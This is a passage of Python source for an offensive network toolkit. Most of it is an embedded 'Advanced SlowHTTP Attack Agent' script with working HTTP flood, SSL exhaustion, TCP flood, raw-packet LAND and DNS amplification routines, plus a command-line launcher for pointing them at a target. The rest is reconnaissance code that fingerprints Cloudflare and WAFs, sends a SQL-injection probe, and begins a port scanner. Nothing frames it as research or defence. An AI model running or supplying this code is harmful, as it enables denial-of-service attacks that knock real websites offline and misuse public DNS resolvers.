                            except Exception:
                                # Failed to create new connection, just continue
                                pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before reading more data
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def http_flood_attack(self, num_connections, requests_per_connection, duration):
        """HTTP Flood attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting HTTP Flood attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Requests per connection: {requests_per_connection}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Generate random paths for the requests
        paths = [
            self.path,
            f"{self.path}?id={random.randint(1, 1000)}",
            f"{self.path}?page={random.randint(1, 100)}",
            f"{self.path}?search={random.choice('abcdefghijklmnopqrstuvwxyz')}",
            f"{self.path}?ref={random.randint(1000, 9999)}"
        ]
        
        # Create thread pool for sending requests
        threads = []
        
        def send_requests(thread_id):
            requests_sent = 0
            errors = 0
            bytes_sent = 0
            response_codes = {}
            
            while time.time() < end_time and self.running and requests_sent < requests_per_connection:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        s = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Choose random path
                    path = random.choice(paths)
                    
                    # Send complete HTTP request
                    request = f"GET {path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += f"User-Agent: {self.user_agent}\\r\\n"
                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
                    request += "Accept-Encoding: gzip, deflate\\r\\n"
                    request += "Connection: close\\r\\n"  # Close connection after response
                    request += "Cache-Control: no-cache\\r\\n"
                    request += f"X-Request-ID: {random.randint(1000000, 9999999)}\\r\\n"
                    request += "\\r\\n"
                    
                    # Send request
                    s.send(request.encode())
                    
                    # Update local stats
                    requests_sent += 1
                    bytes_sent += len(request)
                    
                    # Try to read response code
                    try:
                        response = s.recv(4096).decode('utf-8', errors='ignore')
                        if response.startswith('HTTP/'):
                            status_code = response.split(' ')[1]
                            if status_code in response_codes:
                                response_codes[status_code] += 1
                            else:
                                response_codes[status_code] = 1
                    except:
                        pass
                    
                    # Close socket
                    s.close()
                    
                except Exception as e:
                    errors += 1
                    if errors % 100 == 0:
                        print(f"[!] Thread {thread_id} error: {str(e)}")
                
                # Small sleep to avoid overwhelming local resources
                time.sleep(0.01)
            
            # Update global stats
            with self.lock:
                self.stats["packets_sent"] += requests_sent
                self.stats["bytes_sent"] += bytes_sent
                self.stats["error_count"] += errors
                
                # Merge response codes
                for code, count in response_codes.items():
                    if code in self.stats["response_codes"]:
                        self.stats["response_codes"][code] += count
                    else:
                        self.stats["response_codes"][code] = count
        
        try:
            # Start threads
            for i in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=send_requests, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)
                
                # Update stats
                with self.lock:
                    self.stats["connections_active"] += 1
                
                # Sleep briefly between thread starts
                if i % 50 == 0:
                    time.sleep(0.1)
            
            print(f"[*] Started {len(threads)} threads")
            
            # Monitor and report progress
            while time.time() < end_time and self.running:
                # Count active threads
                active_threads = sum(1 for t in threads if t.is_alive())
                
                with self.lock:
                    self.stats["connections_active"] = active_threads
                
                # Print status update
                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} requests sent, {self.stats['error_count']} errors")
                
                # Print response codes if available
                if self.stats["response_codes"]:
                    codes_str = ", ".join(f"{code}: {count}" for code, count in self.stats["response_codes"].items())
                    print(f"[*] Response codes: {codes_str}")
                
                # Sleep before next update
                time.sleep(1)
        
        finally:
            # Clean up
            self.running = False
            
            # Wait for threads to finish
            for t in threads:
                t.join(0.1)
            
            print("[*] Attack completed")
    
    def ssl_exhaust_attack(self, num_connections, delay, duration):
        """SSL Exhaustion attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting SSL Exhaustion attack on {self.target}:{self.port}")
        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
        
        # Force SSL for this attack
        self.use_ssl = True
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Create initial connections
            for i in range(num_connections):
                if not self.running:
                    break
                
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    
                    # Connect to target
                    s.connect((self.target, self.port))
                    
                    # Wrap with SSL but with custom parameters to maximize resource usage
                    context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    # Enable all available ciphers
                    context.set_ciphers("ALL")
                    
                    # Start SSL handshake
                    ssl_sock = context.wrap_socket(s, server_hostname=self.target)
                    
                    # Send a minimal HTTP request to keep the connection alive
                    request = f"GET {self.path} HTTP/1.1\\r\\n"
                    request += f"Host: {self.target}\\r\\n"
                    request += "Connection: keep-alive\\r\\n"
                    request += "\\r\\n"
                    
                    ssl_sock.send(request.encode())
                    
                    # Update stats
                    with self.lock:
                        self.stats["connections_active"] += 1
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(request)
                    
                    # Add to connections list
                    self.connections.append(ssl_sock)
                    
                    # Sleep briefly between connections
                    if i % 10 == 0:  # More frequent sleeps for SSL connections
                        time.sleep(0.2)
                        
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    if i % 10 == 0:
                        print(f"[!] Error creating connection {i}: {str(e)}")
            
            print(f"[*] Established {len(self.connections)} SSL connections")
            
            # Keep connections alive and create new ones as needed
            while time.time() < end_time and self.running:
                # Check current connections and send keepalive
                for i, s in enumerate(list(self.connections)):
                    try:
                        # Send a small piece of data to keep connection alive
                        s.send(b"\\r\\n")
                        
                        # Update stats
                        with self.lock:
                            self.stats["packets_sent"] += 1
                            self.stats["bytes_sent"] += 2
                            
                    except Exception as e:
                        # Connection closed or error, remove it
                        with self.lock:
                            self.stats["connections_active"] -= 1
                            self.stats["error_count"] += 1
                        
                        try:
                            s.close()
                            self.connections.remove(s)
                        except:
                            pass
                        
                        # Try to create a new connection
                        try:
                            # Create socket
                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            new_s.settimeout(5)
                            
                            # Connect to target
                            new_s.connect((self.target, self.port))
                            
                            # Wrap with SSL but with custom parameters
                            context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                            context.check_hostname = False
                            context.verify_mode = ssl.CERT_NONE
                            
                            # Enable all available ciphers
                            context.set_ciphers("ALL")
                            
                            # Start SSL handshake
                            ssl_sock = context.wrap_socket(new_s, server_hostname=self.target)
                            
                            # Send a minimal HTTP request to keep the connection alive
                            request = f"GET {self.path} HTTP/1.1\\r\\n"
                            request += f"Host: {self.target}\\r\\n"
                            request += "Connection: keep-alive\\r\\n"
                            request += "\\r\\n"
                            
                            ssl_sock.send(request.encode())
                            
                            # Update stats
                            with self.lock:
                                self.stats["connections_active"] += 1
                                self.stats["packets_sent"] += 1
                                self.stats["bytes_sent"] += len(request)
                            
                            # Add to connections list
                            self.connections.append(ssl_sock)
                            
                        except Exception:
                            # Failed to create new connection, just continue
                            pass
                
                # Print status update
                print(f"[*] Status: {len(self.connections)} SSL connections active, {self.stats['packets_sent']} packets sent")
                
                # Sleep before checking connections again
                time.sleep(delay)
        
        finally:
            # Clean up
            self.stop_attack()
            print("[*] Attack completed")
    
    def tcp_flood_attack(self, port, num_connections, duration):
        """TCP Flood attack"""
        self.running = True
        self.connections = []
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting TCP Flood attack on {self.target}:{port}")
        print(f"[*] Connections: {num_connections}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.stop_attack()
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # Create thread pool for sending packets
        threads = []
        
        def send_packets(thread_id):
            packets_sent = 0
            errors = 0
            bytes_sent = 0
            
            while time.time() < end_time and self.running:
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)  # Short timeout
                    
                    # Connect to target
                    s.connect((self.target, port))
                    
                    # Generate random data
                    data_size = random.randint(1, 1024)  # 1 to 1024 bytes
                    data = os.urandom(data_size)
                    
                    # Send data
                    s.send(data)
                    
                    # Update local stats
                    packets_sent += 1
                    bytes_sent += data_size
                    
                    # Close socket immediately to free resources for new connections
                    s.close()
                    
                except Exception as e:
                    errors += 1
                    if errors % 1000 == 0:
                        print(f"[!] Thread {thread_id} error: {str(e)}")
                
                # Small sleep to avoid overwhelming local resources
                time.sleep(0.001)
            
            # Update global stats
            with self.lock:
                self.stats["packets_sent"] += packets_sent
                self.stats["bytes_sent"] += bytes_sent
                self.stats["error_count"] += errors
        
        try:
            # Start threads
            for i in range(num_connections):
                if not self.running:
                    break
                
                t = threading.Thread(target=send_packets, args=(i,))
                t.daemon = True
                t.start()
                threads.append(t)
                
                # Update stats
                with self.lock:
                    self.stats["connections_active"] += 1
                
                # Sleep briefly between thread starts
                if i % 100 == 0:
                    time.sleep(0.1)
            
            print(f"[*] Started {len(threads)} threads")
            
            # Monitor and report progress
            while time.time() < end_time and self.running:
                # Count active threads
                active_threads = sum(1 for t in threads if t.is_alive())
                
                with self.lock:
                    self.stats["connections_active"] = active_threads
                
                # Print status update
                print(f"[*] Status: {active_threads} threads active, {self.stats['packets_sent']} packets sent, {self.stats['bytes_sent']} bytes sent")
                
                # Sleep before next update
                time.sleep(1)
        
        finally:
            # Clean up
            self.running = False
            
            # Wait for threads to finish
            for t in threads:
                t.join(0.1)
            
            print("[*] Attack completed")
    
    def land_attack(self, num_packets, duration):
        """LAND attack (same source and destination IP/port)"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting LAND attack on {self.target}:{self.port}")
        print(f"[*] Packets: {num_packets}, Duration: {duration}s")
        print(f"[!] Warning: This attack requires raw socket privileges (root/administrator)")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        try:
            # Resolve target IP
            target_ip = socket.gethostbyname(self.target)
            
            # Create raw socket
            try:
                if os.name == 'nt':  # Windows
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                else:  # Linux/Unix
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            except PermissionError:
                print("[!] Error: Raw socket creation requires administrator/root privileges")
                return
            except Exception as e:
                print(f"[!] Error creating raw socket: {str(e)}")
                return
            
            # Function to calculate TCP/IP checksum
            def checksum(msg):
                s = 0
                for i in range(0, len(msg), 2):
                    if i + 1 < len(msg):
                        w = (msg[i] << 8) + msg[i + 1]
                    else:
                        w = msg[i] << 8
                    s = s + w
                
                s = (s >> 16) + (s & 0xffff)
                s = s + (s >> 16)
                
                return ~s & 0xffff
            
            packets_sent = 0
            
            while time.time() < end_time and self.running and packets_sent < num_packets:
                try:
                    # Create IP header
                    ip_ihl = 5
                    ip_ver = 4
                    ip_tos = 0
                    ip_tot_len = 20 + 20  # IP header + TCP header
                    ip_id = random.randint(1, 65535)
                    ip_frag_off = 0
                    ip_ttl = 255
                    ip_proto = socket.IPPROTO_TCP
                    ip_check = 0
                    ip_saddr = socket.inet_aton(target_ip)  # Source = Target (LAND attack)
                    ip_daddr = socket.inet_aton(target_ip)  # Destination = Target
                    
                    ip_ihl_ver = (ip_ver << 4) + ip_ihl
                    
                    ip_header = struct.pack('!BBHHHBBH4s4s',
                        ip_ihl_ver,
                        ip_tos,
                        ip_tot_len,
                        ip_id,
                        ip_frag_off,
                        ip_ttl,
                        ip_proto,
                        ip_check,
                        ip_saddr,
                        ip_daddr
                    )
                    
                    # Create TCP header
                    tcp_source = self.port  # Source port = Target port (LAND attack)
                    tcp_dest = self.port    # Destination port = Target port
                    tcp_seq = random.randint(1, 4294967295)
                    tcp_ack_seq = 0
                    tcp_doff = 5
                    tcp_fin = 0
                    tcp_syn = 1
                    tcp_rst = 0
                    tcp_psh = 0
                    tcp_ack = 0
                    tcp_urg = 0
                    tcp_window = socket.htons(5840)
                    tcp_check = 0
                    tcp_urg_ptr = 0
                    
                    tcp_offset_res = (tcp_doff << 4) + 0
                    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
                    
                    tcp_header = struct.pack('!HHLLBBHHH',
                        tcp_source,
                        tcp_dest,
                        tcp_seq,
                        tcp_ack_seq,
                        tcp_offset_res,
                        tcp_flags,
                        tcp_window,
                        tcp_check,
                        tcp_urg_ptr
                    )
                    
                    # Pseudo header for TCP checksum
                    source_address = socket.inet_aton(target_ip)
                    dest_address = socket.inet_aton(target_ip)
                    placeholder = 0
                    protocol = socket.IPPROTO_TCP
                    tcp_length = len(tcp_header)
                    
                    psh = struct.pack('!4s4sBBH',
                        source_address,
                        dest_address,
                        placeholder,
                        protocol,
                        tcp_length
                    )
                    
                    psh = psh + tcp_header
                    
                    tcp_check = checksum(psh)
                    
                    # Repack TCP header with calculated checksum
                    tcp_header = struct.pack('!HHLLBBH',
                        tcp_source,
                        tcp_dest,
                        tcp_seq,
                        tcp_ack_seq,
                        tcp_offset_res,
                        tcp_flags,
                        tcp_window
                    ) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
                    
                    # Final packet
                    packet = ip_header + tcp_header
                    
                    # Send packet
                    s.sendto(packet, (target_ip, 0))
                    
                    # Update stats
                    packets_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(packet)
                    
                    # Print status periodically
                    if packets_sent % 100 == 0:
                        print(f"[*] Sent {packets_sent} LAND attack packets")
                    
                    # Small sleep to avoid overwhelming local resources
                    time.sleep(0.01)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending LAND packet: {str(e)}")
                    time.sleep(1)  # Sleep longer on error
            
            print(f"[*] LAND attack completed. Sent {packets_sent} packets")
            
        except Exception as e:
            print(f"[!] LAND attack failed: {str(e)}")
        finally:
            # Clean up
            self.running = False
            print("[*] Attack completed")
    
    def dns_amplification_attack(self, target_ip, num_queries, duration):
        """DNS Amplification attack"""
        self.running = True
        self.stats = {
            "connections_active": 0,
            "packets_sent": 0,
            "bytes_sent": 0,
            "error_count": 0,
            "response_codes": {}
        }
        
        print(f"[*] Starting DNS Amplification attack on {target_ip}")
        print(f"[*] Queries: {num_queries}, Duration: {duration}s")
        
        # Set up signal handler for graceful shutdown
        def signal_handler(sig, frame):
            print("\\n[!] Stopping attack...")
            self.running = False
        
        signal.signal(signal.SIGINT, signal_handler)
        
        # Start timer for duration
        end_time = time.time() + duration
        
        # List of DNS servers to use for amplification
        dns_servers = [
            "8.8.8.8",       # Google
            "8.8.4.4",       # Google
            "9.9.9.9",       # Quad9
            "1.1.1.1",       # Cloudflare
            "1.0.0.1",       # Cloudflare
            "208.67.222.222",# OpenDNS
            "208.67.220.220" # OpenDNS
        ]
        
        # List of domains to query (preferably with large responses)
        domains = [
            "google.com",
            "facebook.com",
            "amazon.com",
            "microsoft.com",
            "apple.com",
            "netflix.com",
            "yahoo.com"
        ]
        
        # DNS query types that typically return large responses
        query_types = [
            b"\\x00\\x0f",  # MX record
            b"\\x00\\x10",  # TXT record
            b"\\x00\\x02",  # NS record
            b"\\x00\\x01",  # A record
            b"\\x00\\x0c"   # PTR record
        ]
        
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            queries_sent = 0
            
            while time.time() < end_time and self.running and queries_sent < num_queries:
                try:
                    # Select random DNS server and domain
                    dns_server = random.choice(dns_servers)
                    domain = random.choice(domains)
                    query_type = random.choice(query_types)
                    
                    # Create DNS query
                    transaction_id = os.urandom(2)
                    
                    # DNS Header
                    flags = b"\\x01\\x00"  # Standard query, recursion desired
                    questions = b"\\x00\\x01"  # One question
                    answer_rrs = b"\\x00\\x00"  # No answers
                    authority_rrs = b"\\x00\\x00"  # No authority
                    additional_rrs = b"\\x00\\x00"  # No additional
                    
                    header = transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs
                    
                    # DNS Question
                    domain_parts = domain.split('.')
                    question = b""
                    
                    for part in domain_parts:
                        length = len(part)
                        question += bytes([length]) + part.encode()
                    
                    question += b"\\x00"  # Null terminator
                    question += query_type  # Query type
                    question += b"\\x00\\x01"  # Query class (IN)
                    
                    # Complete DNS query
                    dns_query = header + question
                    
                    # Spoof source IP to target IP (UDP spoofing)
                    # Note: This requires raw sockets and root privileges in most cases
                    # For this example, we'll just send from our real IP as a demonstration
                    
                    # Send query to DNS server
                    sock.sendto(dns_query, (dns_server, 53))
                    
                    # Update stats
                    queries_sent += 1
                    with self.lock:
                        self.stats["packets_sent"] += 1
                        self.stats["bytes_sent"] += len(dns_query)
                    
                    # Print status periodically
                    if queries_sent % 100 == 0:
                        print(f"[*] Sent {queries_sent} DNS amplification queries")
                    
                    # Small sleep to avoid overwhelming local resources
                    time.sleep(0.01)
                    
                except Exception as e:
                    with self.lock:
                        self.stats["error_count"] += 1
                    print(f"[!] Error sending DNS query: {str(e)}")
                    time.sleep(0.1)  # Sleep longer on error
            
            print(f"[*] DNS amplification attack completed. Sent {queries_sent} queries")
            
        except Exception as e:
            print(f"[!] DNS amplification attack failed: {str(e)}")
        finally:
            # Clean up
            sock.close()
            self.running = False
            print("[*] Attack completed")
    
    def stop_attack(self):
        """Stop the attack and clean up connections"""
        self.running = False
        
        # Close all connections
        for s in self.connections:
            try:
                s.close()
            except:
                pass
        
        self.connections = []
        
        # Final stats update
        with self.lock:
            self.stats["connections_active"] = 0
        
        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")

def main():
    parser = argparse.ArgumentParser(description="Advanced SlowHTTP Attack Agent")
    parser.add_argument("--target", help="Target hostname or IP")
    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
    parser.add_argument("--path", default="/", help="Target path (default: /)")
    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read", "http_flood", "ssl_exhaust", "tcp_flood", "land", "dns_amplification"], default="slowloris", help="Attack type")
    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
    parser.add_argument("--requests", type=int, default=1000, help="Requests per connection for HTTP flood (default: 1000)")
    parser.add_argument("--target-ip", help="Target IP for DNS amplification attack")
    parser.add_argument("--version", action="store_true", help="Show version and exit")
    
    args = parser.parse_args()
    
    if args.version:
        print(f"Advanced SlowHTTP Attack Agent v{VERSION}")
        sys.exit(0)
    
    if not args.target:
        parser.print_help()
        sys.exit(1)
    
    # Parse URL if full URL is provided
    if args.target.startswith(("http://", "https://")):
        parsed_url = urlparse(args.target)
        target_host = parsed_url.netloc
        use_ssl = args.target.startswith("https://")
        path = parsed_url.path if parsed_url.path else "/"
        port = parsed_url.port or (443 if use_ssl else 80)
    else:
        target_host = args.target
        use_ssl = args.ssl
        path = args.path
        port = args.port
    
    # Create attacker
    attacker = AdvancedHTTPAttacker(target_host, port, use_ssl, path=path)
    
    try:
        # Launch attack based on type
        if args.attack_type == "slowloris":
            attacker.slowloris_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_post":
            attacker.slow_post_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "slow_read":
            attacker.slow_read_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "http_flood":
            attacker.http_flood_attack(args.connections, args.requests, args.duration)
        elif args.attack_type == "ssl_exhaust":
            if not use_ssl:
                print("[WARNING] SSL Exhaust attack works best with HTTPS targets")
                use_ssl = True
                attacker.use_ssl = True
            attacker.ssl_exhaust_attack(args.connections, args.delay, args.duration)
        elif args.attack_type == "tcp_flood":
            attacker.tcp_flood_attack(port, args.connections, args.duration)
        elif args.attack_type == "land":
            attacker.land_attack(args.connections, args.duration)
        elif args.attack_type == "dns_amplification":
            if not args.target_ip:
                print("[ERROR] DNS Amplification attack requires --target-ip parameter")
                sys.exit(1)
            attacker.dns_amplification_attack(args.target_ip, args.connections, args.duration)
    except KeyboardInterrupt:
        print("\\n[INTERRUPTED] Stopping attack...")
        attacker.stop_attack()
    except Exception as e:
        print(f"[ERROR] {str(e)}")
        attacker.stop_attack()
    finally:
        print("[CLEANUP] Attack completed")

if __name__ == "__main__":
    main()
'''

class NetworkTools:
    """Network reconnaissance and analysis tools"""
    
    def __init__(self):
        """Initialize network tools"""
        self.cache = {}  # Cache for DNS and other lookups
    
    def lookup_dns_history(self, domain):
        """Look up current and historical DNS records"""
        results = {
            "domain": domain,
            "current_records": {},
            "historical_records": []
        }
        
        # Get current DNS records
        record_types = ["A", "AAAA", "MX", "NS", "TXT", "CNAME"]
        
        for record_type in record_types:
            try:
                if DNS_AVAILABLE:
                    answers = dns.resolver.resolve(domain, record_type)
                    results["current_records"][record_type] = [str(rdata) for rdata in answers]
                else:
                    # Fallback using socket for A records
                    if record_type == "A":
                        try:
                            ip = socket.gethostbyname(domain)
                            results["current_records"]["A"] = [ip]
                        except:
                            results["current_records"]["A"] = []
                    else:
                        results["current_records"][record_type] = []
            except Exception as e:
                results["current_records"][record_type] = []
        
        # For historical records, we would need external API access
        # This is a placeholder - in a real implementation, you might use a service like SecurityTrails
        
        # Add some sample historical data for demonstration
        if "A" in results["current_records"] and results["current_records"]["A"]:
            current_ip = results["current_records"]["A"][0]
            # Add a fake historical record
            results["historical_records"].append({
                "date": "2023-01-01",
                "record_type": "A",
                "value": current_ip
            })
        
        return results
    
    def detect_cloudflare(self, domain):
        """Detect if a domain is behind Cloudflare"""
        results = {
            "domain": domain,
            "is_behind_cloudflare": False,
            "evidence": [],
            "cloudflare_ips": [],
            "direct_ips": []
        }
        
        # Check DNS records
        try:
            if DNS_AVAILABLE:
                answers = dns.resolver.resolve(domain, "A")
                ips = [str(rdata) for rdata in answers]
            else:
                try:
                    ip = socket.gethostbyname(domain)
                    ips = [ip]
                except:
                    ips = []
            
            results["direct_ips"] = ips
            
            # Check if IPs are in Cloudflare ranges
            # This is a simplified check - real implementation would use actual Cloudflare IP ranges
            cloudflare_indicators = ["172.64.", "104.16.", "104.17.", "104.18.", "104.19.", "104.20.", "104.21.", "104.22.", "104.23.", "104.24.", "104.25.", "104.26.", "104.27.", "104.28.", "131.0.72."]
            
            for ip in ips:
                for indicator in cloudflare_indicators:
                    if ip.startswith(indicator):
                        results["is_behind_cloudflare"] = True
                        results["evidence"].append(f"IP {ip} is in Cloudflare range")
                        results["cloudflare_ips"].append(ip)
        except Exception as e:
            logger.error(f"Error checking Cloudflare: {str(e)}")
        
        # Check HTTP headers
        if REQUESTS_AVAILABLE:
            try:
                url = f"http://{domain}"
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
                }
                response = requests.get(url, headers=headers, timeout=5)
                
                # Check for Cloudflare headers
                if "cf-ray" in response.headers:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"CF-Ray header found: {response.headers['cf-ray']}")
                
                if "server" in response.headers and "cloudflare" in response.headers["server"].lower():
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"Server header indicates Cloudflare: {response.headers['server']}")
                
                if "cf-cache-status" in response.headers:
                    results["is_behind_cloudflare"] = True
                    results["evidence"].append(f"CF-Cache-Status header found: {response.headers['cf-cache-status']}")
            except Exception as e:
                logger.debug(f"Error checking HTTP headers: {str(e)}")
        
        return results
    
    def detect_waf(self, url):
        """Detect Web Application Firewall (WAF) on target"""
        results = {
            "url": url,
            "waf_detected": False,
            "waf_type": None,
            "evidence": [],
            "cloudflare_detected": False
        }
        
        if not REQUESTS_AVAILABLE:
            results["evidence"].append("Requests module not available, limited detection")
            return results
        
        # Parse URL
        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        
        # Check for Cloudflare first
        cloudflare_results = self.detect_cloudflare(domain)
        if cloudflare_results["is_behind_cloudflare"]:
            results["waf_detected"] = True
            results["waf_type"] = "Cloudflare"
            results["cloudflare_detected"] = True
            results["evidence"].extend(cloudflare_results["evidence"])
        
        # Check for other WAFs
        try:
            # Normal request
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            response = requests.get(url, headers=headers, timeout=10)
            
            # Check headers for WAF indicators
            waf_headers = {
                "X-Powered-By": ["ASP.NET", "PHP"],
                "Server": ["Apache", "nginx", "Microsoft-IIS", "cloudflare"],
                "X-AspNet-Version": [""],
                "X-AspNetMvc-Version": [""],
                "X-Sucuri-ID": ["Sucuri/Cloudproxy"],
                "X-Sucuri-Cache": ["Sucuri"],
                "X-Mod-Pagespeed": [""],
                "X-Varnish": [""],
                "X-Cache": [""],
                "X-Cache-Hits": [""],
                "X-Served-By": [""],
                "X-CDN": ["Incapsula"],
                "Set-Cookie": ["incap_ses", "visid_incap", "awsalb", "awsalbcors", "ASLBSA", "ASPSESSIONID"]
            }
            
            for header, values in waf_headers.items():
                if header in response.headers:
                    for value in values:
                        if value and value in response.headers[header].lower():
                            results["waf_detected"] = True
                            results["evidence"].append(f"{header} header indicates {value}")
                            if "cloudflare" in response.headers[header].lower():
                                results["waf_type"] = "Cloudflare"
                                results["cloudflare_detected"] = True
                            elif "sucuri" in response.headers[header].lower():
                                results["waf_type"] = "Sucuri"
                            elif "incap" in response.headers[header].lower():
                                results["waf_type"] = "Incapsula"
                            elif "akamai" in response.headers[header].lower():
                                results["waf_type"] = "Akamai"
                            elif "f5" in response.headers[header].lower():
                                results["waf_type"] = "F5 BIG-IP"
                            elif "aws" in response.headers[header].lower():
                                results["waf_type"] = "AWS WAF"
            
            # Check cookies for WAF indicators
            if "Set-Cookie" in response.headers:
                cookies = response.headers["Set-Cookie"]
                if "incap_ses" in cookies or "visid_incap" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "Incapsula"
                    results["evidence"].append("Incapsula cookies detected")
                elif "awsalb" in cookies or "awsalbcors" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "AWS WAF/ALB"
                    results["evidence"].append("AWS ALB cookies detected")
                elif "__cfduid" in cookies or "cf_clearance" in cookies:
                    results["waf_detected"] = True
                    results["waf_type"] = "Cloudflare"
                    results["cloudflare_detected"] = True
                    results["evidence"].append("Cloudflare cookies detected")
            
            # Try a malicious request to trigger WAF
            try:
                malicious_url = f"{url}?id=1' OR 1=1 --"
                malicious_response = requests.get(malicious_url, headers=headers, timeout=5)
                
                # Check if response is different (blocked)
                if malicious_response.status_code != response.status_code:
                    results["waf_detected"] = True
                    results["evidence"].append(f"Malicious request returned different status code: {malicious_response.status_code} vs {response.status_code}")
                
                # Check for WAF block page indicators
                block_indicators = [
                    "blocked", "firewall", "security", "waf", "not allowed", "disallowed", 
                    "malicious", "protection", "detected", "attack", "suspicious"
                ]
                
                for indicator in block_indicators:
                    if indicator in malicious_response.text.lower():
                        results["waf_detected"] = True
                        results["evidence"].append(f"Block page indicator found: '{indicator}'")
            except Exception as e:
                # If the malicious request fails but the normal one succeeded, it might be WAF
                results["waf_detected"] = True
                results["evidence"].append(f"Malicious request failed: {str(e)}")
        
        except Exception as e:
            logger.error(f"Error detecting WAF: {str(e)}")
        
        return results
    
    def scan_ports(self, target, port_range):
        """Scan ports on target host"""
        results = {
            "target": target,
            "open_ports": [],
            "scan_time": 0
        }
        
        # Parse port range
        ports_to_scan = []
        if "-" in port_range:
            start, end = port_range.split("-")
            ports_to_scan = range(int(start), int(end) + 1)
        else:
            ports_to_scan = [int(p) for p in port_range.split(",")]
        
        # Start timer
        start_time = time.time()
        
        # Common service names
        common_services = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            110: "POP3",
            143: "IMAP",
            443: "HTTPS",
